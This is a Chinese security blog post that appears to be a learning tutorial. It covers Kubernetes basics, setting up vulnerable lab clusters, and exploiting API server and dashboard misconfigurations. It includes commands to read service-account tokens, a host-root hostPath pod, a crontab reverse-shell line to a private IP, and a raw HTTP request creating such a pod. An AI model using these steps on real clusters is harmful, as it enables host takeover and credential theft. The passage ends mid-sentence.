<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/YMkx5upSN5tCNyaRkcX34w)

转自：UzJu 的安全屋
============

![](https://mmbiz.qpic.cn/mmbiz_jpg/p5qELRDe5icm0miawGB3eht3wL3Arsc5icLYjvQOABleBzj9eTvIHhs3ttD4UJQu16KcWaeenWiawxsp7xAoJhfIdA/640?wx_fmt=jpeg)

一、前言
====

这篇文章可能出现一些图文截图颜色或者命令端口不一样的情况，原因是因为这篇文章是我重复尝试过好多次才写的，所以比如正常应该是访问 6443，但是截图中是显示大端口比如 60123 这种，不影响阅读和文章逻辑，无需理会即可，另外 k8s 基础那一栏。。。本来想写一下 k8s 的鉴权，后来想了想，太长了，不便于我查笔记，还不如分开写，所以 K8S 基础那里属于凑数？？？写了懒得删（虽然是粘贴的：））

吐槽一下：其实我发现 K8S 搭建失败的大部分原因，都是出于网络不同的原因，所以我建议直接上香港的服务器，不太建议在本地虚拟机搭建，当然我本地也搭建了虚拟机的 k8s 集群（我用公司的阿里云开的服务器，100M 带宽，确实快哈哈哈）

在学习 k8s 安全的时候，大家花费最多时间的地方应该就是 K8S 的搭建了，当然大佬除外，我这种菜狗才会搭环境搭很久

香港服务器搭建

1、有成本（哪怕是按量付费，也有一定的成本）

2、好处就是能快速的搭建，不会出现网络导致搭建失败的问题

本地虚拟机搭建

1、0 成本（但是有时间成本，可能在香港服务器上 1 个小时就能解决的事情，在本地要花很久）

2、好处就是配置好静态地址之后，以后在哪个网络环境都可以访问

二、k8s 基础
========

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryam2UMpp0QEeeJxk9Rj9YAW9V6Te8ibvq5409y20zGSXt6lBIltTcarQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

K8S 全称 kubernetes，是由 Google 在 2014 年开源的生产级别的容器编排系统，或者说是微服务和云原生平台。虽说 14 年才开源，但实际上 K8S 是 Google 内部的容器编排系统 Borg 的开源版本，在 Google 内部已经用了十多年了。下面是一个关于 K8S 的 Logo 来源的小插曲。

Kubernetes 由谷歌在 2014 年首次对外宣布 。它的开发和设计都深受谷歌的 Borg 系统的影响，它的许多顶级贡献者之前也是 Borg 系统的开发者。在谷歌内部，Kubernetes 的原始代号曾经是 Seven，即星际迷航中友好的 Borg(博格人) 角色。Kubernetes 标识中舵轮有七个轮辐就是对该项目代号的致意。  不过也有一个说法是，Docker 的 Logo 是一个驮着集装箱的鲸鱼，也就是运输船，K8S 的 Logo 是一个船舵，旨在引领着 Docker（或者说容器技术）走向远方。

1、Master
--------

Master 节点是 Kubernetes 集群的控制节点，每个 Kubernetes 集群里至少有一个 Master 节点，它负责整个集群的决策（如调度），发现和响应集群的事件。Master 节点可以运行在集群中的任意一个节点上，但是最好将 Master 节点作为一个独立节点，不在该节点上创建容器，因为如果该节点出现问题导致宕机或不可用，整个集群的管理就会失效。

在 Master 节点上，通常会运行以下服务：

*   kube-apiserver: 部署在 Master 上暴露 Kubernetes API，是 Kubernetes 的控制面。
    
*   etcd: 一致且高度可用的 Key-Value 存储，用作 Kubernetes 的所有群集数据的后备存储，在 K8s 中有两个服务需要用到 etcd 来协同和配置，分别如下
    

*   网络插件 flannel、对于其它网络插件也需要用到 etcd 存储网络的配置信息
    
*   Kubernetes 本身，包括各种对象的状态和元信息配置
    
*   注意：flannel 操作 etcd 使用的是 v2 的 API，而 Kubernetes 操作 etcd 使用的 v3 的 API，所以在下面我们执行 etcdctl 的时候需要设置 ETCDCTL_API 环境变量，该变量默认值为 2。
    
*   etcd 实现原理：http://jolestar.com/etcd-architecture/
    

*   kube-scheduler: 调度器，运行在 Master 上，用于监控节点中的容器运行情况，并挑选节点来创建新的容器。调度决策所考虑的因素包括资源需求，硬件 / 软件 / 策略约束，亲和和排斥性规范，数据位置，工作负载间干扰和最后期限。
    
*   kube-controller-manager：控制和管理器，运行在 Master 上，每个控制器都是独立的进程，但为了降低复杂性，这些控制器都被编译成单一的二进制文件，并以单独的进程运行。
    

2、Node
------

Node 节点是 Kubernetes 集群的工作节点，每个集群中至少需要一台 Node 节点，它负责真正的运行 Pod，当某个 Node 节点出现问题而导致宕机时，Master 会自动将该节点上的 Pod 调度到其他节点。Node 节点可以运行在物理机上，也可以运行在虚拟机中。

在 Node 节点上，通常会运行以下服务：

*   kubelet: 运行在每一个 Node 节点上的客户端，负责 Pod 对应的容器创建，启动和停止等任务，同时和 Master 节点进行通信，实现集群管理的基本功能。
    
*   kube-proxy: 负责 Kubernetes Services 的通信和负载均衡机制。
    
*   Docker Engine: 负责节点上的容器的创建和管理。
    

Node 节点可以在集群运行期间动态增加，只要整个节点已经正确安装配置和启动了上面的进程。在默认情况下，kubelet 会向 Master 自动注册。一旦 Node 被接入到集群管理中，kubelet 会定时向 Master 节点汇报自身的情况（操作系统，Docker 版本，CPU 内存使用情况等），这样 Master 便可以在知道每个节点的详细情况的同时，还能知道该节点是否是正常运行。当 Node 节点心跳超时时，Master 节点会自动判断该节点处于不可用状态，并会对该 Node 节点上的 Pod 进行迁移。

3、Pod
-----

Pod 是 Kubernetes 最重要也是最基本的概念，一个 Pod 是一组共享网络和存储（可以是一个或多个）的容器。Pod 中的容器都是统一进行调度，并且运行在共享上下文中。一个 Pod 被定义为一个逻辑的 host，它包括一个或多个相对耦合的容器。

Pod 的共享上下文，实际上是一组由 namespace、cgroups, 其他资源的隔离的集合，意味着 Pod 中的资源已经是被隔离过了的，而在 Pod 中的每一个独立的 container 又对 Pod 中的资源进行了二次隔离。

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLorypgbzQ1M0tKxvWzfuel8nUluSxaNbqU2pKqrWAXJPGy6VoxJCt4K2sA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

（上图为：K8s 实战攻击路径，· 来自 TSRC）![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryRZ4aKF6ibDIFqNvl70tjjRAfXWvpkHDnxDic0kaZvML8vdEc8ya0gryg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

（上图为：K8s 常见端口，图片有点糊，因为网上找的）

三、k8s - 漏洞环境搭建
==============

1、metarget
----------

推荐这种方式搭建，目前能搜到的应该有以下几种 K8S 搭建方式

1、按照文档一步一步的安装 docker，安装 k8s

2、minikube

3、kind

4、metarget（推荐）

5、github 上的一键安装脚本

但是这几种安装方式都充斥着一些问题，比如在安装的时候会遇到很多问题，而且如果我们想安装安装指定版本又非常麻烦，所以推荐 metarget 的方式进行安装

```
git clone https://github.com/Metarget/metarget.git
cd metaget/ 
pip3 install -r requirements.txt
```

tips: 如果在 centos 下遇到 pip 出现以下情况，并且更新之后没有用的话，那么就用下面的方法![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryEIBJ2B5R2Nhrpibo1Y1Ktfk7B0ic7tI0AGaj2TPR3AGynQjc0RXwZXnw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

```
yum install python3-pip
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryh5WHOw85bg3gPmicmm9hfTBF707pNLzmtPDGAgnQoznNQWCaLzjHrLQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

不过这里建议 Ubuntu 安装，因为。。。![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLorysnLda9qviaCWXj5HKEJ0Avhu401IWl8aFGbfOeGyBicUotoAafShgicHg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

懒得搜了，所以直接换 ubuntu

回到正题，比如我这里想安装一个 1.16 的 k8s，使用以下命令即可

```
./metarget gadget install k8s --version=1.16.5
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLorysTpfh2s1ib3B1udNzdk7lUiasOX6fribQibFibXicTTvBLBuPT0yQUUrNmPQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryk12pfMCiaic6bTFCmJvgJPHVBiagXmjHlS3f5dyg20ysyHHMbNGsrS2bQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

随后就会对 k8s 所需要的组件挨个进行安装并启动![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryAh0L9CAXIU2sfOibNlgHJu1XjQBqG1XPvAXTWrPSnOYtf99unW24ZHg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

不过值得注意的是，如果使用云服务器的话，为了保证端口安全组放通，但是又怕暴露在公网受到攻击，建议安全组端口全开，但是给到指定 IP 才能访问

2、minikube
----------

环境

*   Macos Monterey
    

下载 minikube

```
brew install minikube
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryIzKLKnKUhd1XgOUDKlO29DvqkcfASbH6mdTJMicd2U9VJNPLeEcGibicg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

使用 minikube 快速启动，这里驱动选的是 VMware，指定了 k8s 的版本

```
minikube start --kubernetes-version=v1.16.3 --driver=vmware
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLorynlR70iaQ1FCFtjYQaAM6RDXmHEfNjdpqiaFOZkjZ9M95w1O9MqJ8Y8CA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

```
minikube kubectl -- get pods -A
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryCkWJJE3Lia82amv3qZZjoCRzviawIu8bIia8RqUNz7hyuTMeAzSLslicUQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

```
minikube kubectl get node
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLory0tH6taiba0T8e2W3rUibIjg68H7ibWDz3dqCPib4z1qyS6MznUb0L1jfMw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

还可以通过 minikube 快速启动 k8s 的 dashboard

```
minikube dashboard
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryLjiaKp1J5Z06LmPmjJrdicbNHf4js1Hpr1ytnuHVQmjehmTyrQ4icVN9g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

快速创建一个 Nginx Pod

```
kubectl run nginxfromuzju --image=nginx --port=1112
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryoGicAGcDQQSffTawlsvntcLpdXg05pxkY30YgTEw2p56DtGTwkpMGsg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

3、kind
------

安装 kubectl

```
curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.23.6/bin/linux/amd64/kubectl
chmod +x ./kubectl
mv ./kubectl /usr/local/bin/kubectl
```

下载 kind(需要科学上网)

```
wget https://github.com/kubernetes-sigs/kind/releases/download/v0.12.0/kind-darwin-amd64
chmod +x kind-darwin-amd64
mv ./kind-darwin-amd64 /usr/local/bin/kind
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryro9Mic3XocvUsKzc0bBh1kKFDiczWMSMiaL80yBsTMnnRRtnQu2sl5Tgw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

```
kind create cluster --name k8s
```

快速启动一个 k8s 集群![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryoibMYuMSou9jsyZA418kWPvevlS94kibbkiajqToOXKbju0bsZbDDw57A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

```
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
name: k8suzju  #集群名
nodes: #节点配置，如下，启动一个master节点，一个worker节点
- role: control-plane   #master节点
  image: kindest/node:v1.21.1 #指定镜像，同 kind create cluster参数--image
  extraPortMappings:
  - containerPort: 6443
    hostPort: 26443
    listenAddress: "0.0.0.0"
    protocol: tcp #默认值，可不设置
- role: worker
```

为了解决绑定在本地 127.0.0.1 的问题

```
kind create cluster --config k8s.yaml
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLory2XdACFWk8uXJJpCzVib8vRmwEwcGXENIFlznJykSPAw0d3iav1gDibwNg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

```
kubectl get node
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryARibEpFdBjd22GZ1vaibJxC4pOs2JMFfBSZQKdeYBtibollxAnyhsBeibA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

创建 pods

```
kubectl run nginxfromuzju --image=nginx --port=1112
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryTgwY2wvqtSnNpnA5kdicEo3cdM6BfEL4or7EyVzEHp8rRUfebmdzWww/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

四、Api Server 未授权访问 (8080 与 6443）
================================

部署在 Master 上暴露 Kubernetes API，是 Kubernetes 的控制面。Kubernetes API 服务器为 API 对象验证和配置数据，这些对象包含 Pod，Service，ReplicationController 等等。API Server 提供 REST 操作以及前端到集群的共享状态，所有其他组件可以通过这些共享状态交互。默认情况，Kubernetes API Server 提供 HTTP 的两个端口：8080，6443。insecure-port：默认端口 8080，在 HTTP 中没有认证和授权检查。secure-port ：默认端口 6443， 认证方式，令牌文件或者客户端证书，如下图访问 http://IP:8080![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryzvHlYmr8iaxTN67Siamic0ExDNTy3sOdicMwn3IeGcoxSZftIia7yTO3WeQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

一个 6443 和一个 8080，前者会进行鉴权，后者不会![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLory4WmVoybcQMcBCBClJO4OoVniadevTDpLiafTsegV6VnicW6L2fXy6mOIA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

1、8080 端口未授权访问
--------------

080 对公网开放

### 1、如何打开和关闭 8080 端口

测试了几个版本的 k8s，发现在新版本后，–insecure-port=8080 配置默认就关闭了

```
cd /etc/kubernetes/manifests
vim kube-apiserver.yaml
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryFbPPNAiaQJFlLialtLuTCsxsgH4tZWfrC9u2woXqESA6nj1zfRtQo5EA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

这里设置为 0 表示关闭，甚至在高版本的 k8s 中，直接将 --insecure-port 这个配置删除了，需要手动添加

这里将修改为 8080，并添加配置

```
- --insecure-port=8080
- --insecure-bind-address=0.0.0.0
systemctl restart kubelet
```

上述就是打开 8080 端口的方法![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryicuLSAPbyyjuNCCy7Prm5VxTTFd1jZJjJWoUTiakyy7BLk41cjeqENjQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryyjMIhe7BRKSJhnsH4l6mpbDU8FMBOjUPIoZd7rS6jLl3IPT6ypiazfQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

### 2、执行命令 - 通过 kubectl -s 命令

```
kubectl -s ip:8080 get node
```

ps: 如果使用 minikube 搭建这里可能是随机的大端口![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryXQ0bTUMvmXVGw28Mib8ydKuCGWFFWgrjHpANmZ80piaCb2yGkPQENteQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

获取 Pods

```
kubectl -s 127.0.0.1:8080 get pods
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryLaKrmbPicUAtf5rz6vaQUibM9euAyHib7T1NCGTBJCJNiaWZicVo1uAAlUQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryFiaWzsZwRS8kUcGUsOTV1r8YxvD3tp0dZJJNUZ72E4icPibGFh3L37PYg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

执行命令

```
kubectl -s 127.0.0.1:8080 --namespace=default exec -it nginxfromuzju-59595f6ffc-p8xvk bash
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLory2AFp3UmFeg2JycwdoA5yQsk7QvGVTiaNuvIkWqAU3HUpW1dKBGob7tg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

Tips: 在高版本的 k8s 中，这种方法是不行的，连不上去

### 3、获取 service-account-token

可以通过访问 api 来获取 token

```
/api/v1/namespaces/kube-system/secrets/
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryOy0cDh511zYiaUZgwZWLia90Q71Y9RYPCnPuicBLTkd5KmcGqaavN1Ojg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

### 3、获取宿主机权限 - 通过 k8s dashboard，创建特权 Pods

为什么会出现这个问题：因为在启动 dashborad 的时候，管理员为了方便，修改了配置，跳过了登录

安装 dashborad

```
wget https://raw.githubusercontent.com/kubernetes/dashboard/v2.2.0/aio/deploy/recommended.yaml
vim recommended.yam
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryRtVRYJNf3HVmgKnhBxF4KSPGEicvnMXpxjaGcpufqJ0BKeicianuobkOw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

需要添加两个参数，一个是不需要登录，一个是绑定 0.0.0.0 地址

```
- --enable-skip-login
- -- insecure-bind-address=0.0.0.0
kubectl apply -f recommended.yaml
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLorygQfQOCGo7T8Taxtmktmr9HPzrBGfD1vODCxttrskuN3h9OHbm3JHwg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

这里使用国际友人的配置快速启动

*   https://medium.com/@tejaswi.goudru/disable-authentication-https-in-kubernetes-dashboard-2fada478ce91
    

```
wget https://gist.githubusercontent.com/tejaswigk/da57d7911284cbf56e7f99af0afd6884/raw/de38da2a7619890a72d643d2bbd94278221e5977/insecure-kubernetes-dashboard.yml
kubectl apply -f insecure-kubernetes-dashboard.yml
 kubectl -n kubernetes-dashboard port-forward svc/kubernetes-dashboard  9090:80
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryhibCc4r6Rdmd9wGfj36l3eCtpUib4GnOcxcoD4jNztf3dT4pibSW6gUDw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

如果这种情况不能访问的话，就使用下面的命令

```
kubectl -n kubernetes-dashboard port-forward svc/kubernetes-dashboard --address 0.0.0.0 9090:80
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryQqzgl4yLLKk6w78D7p1kXPI5wIEH9iaMIFaqKwPFGSppgT9sVgVGKfw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

但是我们在这里看到了一个不安全的访问，无法登陆，只需要更换如下的命令即可

```
kubectl -n kubernetes-dashboard port-forward svc/kubernetes-dashboard --address 0.0.0.0 9090:443
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryibgicoibEHpgas7hEkI5AQTS46NneulQA8tZhib4uCiaYZvVVZtl8OnDspw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

配置账号

```
sudo vim  account.yaml
# Creating a Service Account
apiVersion: v1
kind: ServiceAccount
metadata:
  name: admin-user
  namespace: kubernetes-dashboard
---
# Creating a ClusterRoleBinding
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: admin-user
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
- kind: ServiceAccount
  name: admin-user
  namespace: kubernetes-dashboard
kubectl apply -f account.yaml
# 获取token

kubectl -n kubernetes-dashboard get secret $(kubectl -n kubernetes-dashboard get sa/admin-user -o jsonpath="{.secrets[0].name}") -o go-template="\{\{.data.token | base64decode\}\}"
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLory4CpOHo865Rz93nM1V1kV1XibL1qaRucJCN3QSEkrczXctHEPbesk2icw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

这里有个坑。。。。就是端口转发然后会一直连接重置![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryicRbvZqHCakO0C6VVP4HwIfXLTxd89iaalBWlLBHVic1ZNr3klz8KmI5g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

不知道什么原因，如果有大佬知道，虚心请教！这里也有可能是香港服务器不稳定的原因造成的，因为在测试的时候发现有时候服务器的 ssh 也连不上，也会提示连接重置

通过创建 dashboard 创建 pod 并挂在宿主机的根目录

```
apiVersion: v1
kind: Pod
metadata:
  name: myapp
spec:
  containers:
  - image: nginx
    name: container
    volumeMounts:
    - mountPath: /mnt
      name: test-volume
  volumes:
  - name: test-volume
    hostPath:
      path: /
```

这里将宿主机的目录挂在到了 / mnt 目录下![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLorycYxTib0PfbYia6NGXaXYZpwZeXAAUjPCZ6iccZ87lOe8ttnbqNV4icY4Ig/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

ps: minikube 搭建如果此时点击上传返回错误信息 the server could not find the requested resource，在网上看到文章说是 kubectl 的版本不一致的问题，那么也确实，因为 minikube 启动的是 1.16 的 k8s，但是终端的是 1.23，不过不要紧回到 POD 那里之后可以看到已经创建了![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLory1ckUzTh4LZmbnMjgIpjfx50KLWfria0uibiaCUXQiacCmyTUaHAVBCtibwg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryustg3AJerViaMCgHyZ8HCctY0zicz91VzAPNqkmupAwibPFgbCTFLsWmQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

可以通过写 crontab 获取 shell

```
echo -e "* * * * * /bin/bash -i >& /dev/tcp/192.168.0.139/1234 0>&1" >> /mnt/etc/crontab
```

或者通过 chroot 来获取终端![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLorysdM39e4LhDsoarZPW9TEvYqAib8xlMCQafQaqW6XTia88Vv73qgnOyFQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

2、6443 端口 - system:anonymous 错误配置
---------------------------------

如果不小心，将 "system:anonymous" 用户绑定到 "cluster-admin" 用户组，从而使 6443 端口允许匿名用户以管理员权限向集群内部下发指令

本来访问会返回 403![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryRSkCDFqzlSfwibZzTCEXmicX44icA53mS43JxSRVQw4XZveNSmD21Sv7w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

但是使用下面的配置之后就可以了

```
kubectl create clusterrolebinding system:anonymous --clusterrole=cluster-admin --user=system:anonymous
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryI0RsjZ92vnqufIdDOjNgWhnDytxbm8B9Zmiawn8YTcUV1y3n1uQYndA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

可以通过访问 API 来获取 pod

```
/api/v1/namespaces/default/pods
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryICRFdMcib55zl5zsLNrCJp0VF3Zy5ul1xoUF2lko6X8RT9h92iaGic5Gw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

获取 token

```
/api/v1/namespaces/kube-system/secrets/
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryKP6u3dCAKMnfzePXxGW75GFaicUGEX7junzn02mAX2ppvoy0qMvTuQg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

创建特权容器

```
POST /api/v1/namespaces/default/pods HTTP/2
Host: 127.0.0.1:61575
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Content-Length: 1176
{
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {
        "annotations": {
            "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"name\":\"test-4444\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"image\":\"nginx:1.14.2\",\"name\":\"test-4444\",\"volumeMounts\":[{\"mountPath\":\"/host\",\"name\":\"host\"}]}],\"volumes\":[{\"hostPath\":{\"path\":\"/\",\"type\":\"Directory\"},\"name\":\"host\"}]\}\}\n"
        },
        "name": "test-4444",
        "namespace": "default"
    },
    "spec": {
        "containers": [
            {
                "image": "nginx:1.14.2",
                "name": "test-4444",
                "volumeMounts": [
                    {
                        "mountPath": "/host",
                        "name": "host"
                    }
                ]
            }
        ],
        "volumes": [
            {
                "hostPath": {
                    "path": "/",
                    "type": "Directory"
                },
                "name": "host"
            }
        ]
    }
}
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLory2jBFSh35reGUpGOBA3Fk39fvPHwnkHPgybycUVWjRkuNjicVibIibeAwA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

随后执行命令的时候返回 400

```
https://127.0.0.1:61575/api/v1/namespaces/default/pods/test-4444/exec?stdout=1&stderr=1&tty=true&command=whoami
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryyDn6s6BHvHNFCQrPNPkbQhA6VfCGOnvTfDOQbnBs0bnHzg93eYB5DA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryodNic6LicG0JwVZANr9Dk60jpYxtsgb2n4icXznohcXpPEUIoeX3TkBrQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

传统艺能，搜到了这种解决方案，可惜不行：（

安装 wscat

```
npm install -g wscat
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryMYeznxCGzMeMDbqpGlZicJW9M3wSGiaCZ40JXxFfaIg7lh6OMMTHSPHA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryJveDxhKxbSBJRxVVjkiaf73h6gicook2ia5vTfKWZcpjiaI7OhYeG1LQJQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

不过这里还是没解决这个问题

并且还遇到一个问题![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLorydmUTibOKApm6EI3JoUnQ291DIdhREN6RwxDbeKlstbG2ZAib2ibBIkRTg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

一开始我以为是本地的 kubectl 跟服务端的版本不同导致的，后来发现，并不是这样，哪怕我在 k8s 的服务器上使用该命令，还是会出现这个

